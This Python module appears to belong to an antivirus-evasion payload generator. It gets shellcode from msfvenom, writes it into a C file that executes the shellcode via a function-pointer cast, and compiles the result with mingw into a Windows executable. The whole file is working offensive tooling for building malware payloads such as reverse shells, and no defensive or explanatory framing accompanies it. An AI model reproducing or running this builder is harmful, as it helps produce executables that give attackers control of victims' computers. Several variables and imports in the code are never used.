# Code was referenced from:
# https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/template.c

# Import modules
import os
import string
from modules.auxiliary import shellcode
from modules.common import randomizer
from modules.common import messages
from modules.common import csupport

# C Based void pointer
def cVoidPointer ():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandShellcode = randomizer.randomString()
    RandReverseShell = randomizer.randomString()
    RandMemoryShell = randomizer.randomString()

    # Start creating our C payload
    PayloadFile = open('payload.c', 'w')
    PayloadFile.write('unsigned char payload[]=\n')
    PayloadFile.write('\"' + Shellcode + '\";\n')
    PayloadFile.write('int main(void) { ((void (*)())payload)();}')
    PayloadFile.close()

    # Compile our C code
    csupport.compilemingw()
